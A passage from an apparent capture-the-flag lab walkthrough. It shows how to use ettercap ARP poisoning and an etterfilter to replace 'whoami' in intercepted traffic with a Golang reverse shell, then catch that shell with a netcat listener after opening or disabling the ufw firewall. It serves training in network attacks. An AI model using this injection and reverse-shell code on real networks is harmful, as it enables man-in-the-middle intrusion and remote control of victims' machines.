`if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {       log(DATA.data, "/root/ettercap.log");       replace("whoami", "<reverse_shell>" );       msg("###### ETTERFILTER: substituted 'whoami' with reverse shell. ######\n");   }`

  
**Note:** Quotation marks need to be **[escaped](https://linux.die.net/abs-guide/escapingsection.html)**. So, in case you want your filter to **replace** e.g. `whoami` with `echo -e "whoami\nroot"`, then the quotation marks around `whoami\nroot` would have to be escaped like this: `replace("whoami", "echo -e \"whoami\nroot\" " )`

To see a solution for the reverse shell payload, click the dropdown arrow:

_Show possible solution (spoiler!)_

  
The following is an example reverse shell in Golang with quotation marks already escaped:

`echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.12.66:6666\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &`  

  

Finally, we need to compile the**.ecf** into an **.ef** file:

`etterfilter whoami.ecf -o whoami.ef`  

Don't forget to start your listener (backgrounded). For the upper example above, you could use:  

`nc -nvlp 6666 &`  

Not so fast! If anything, we still need to allow the incoming connection through the firewall. Disable **ufw** or create a corresponding **allow** rule; otherwise, Bob's reverse shell will be blocked by the firewall:

`ufw allow in on eth1 from 192.168.12.20 to 192.168.12.66 port 6666 proto tcp` or completely disable the firewall by running `ufw disable`

Now, run **ettercap** specifying your newly created **etterfilter** file:

`ettercap -T -i eth1 -M arp -F whoami.ef`  

A few seconds after executing this command, you should see the _"###### ETTERFILTER: …"_ message and/or _"Connection received on 192.168.12.20 …"_  in your Netcat output, which means you've just caught a reverse shell from Bob! Now, you can quit **ettercap** (with **q**), foreground your Netcat listener (with **fg**), and enjoy your shell!

**Note:** To restrict ettercap's ARP poisoning efforts to your actual targets and only display traffic between them, you can specify them as target groups 1 and 2 by using "///"-token annotation after the **-M arp** option:

`ettercap -T -i eth1 -M arp /192.168.12.10// /192.168.12.20// -F whoami.ef`

**Hint:** In case the reverse shell won't work, try replacing **whoami** with a suitable **cat** command to get the flag.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

https://tryhackme.com/room/layer2
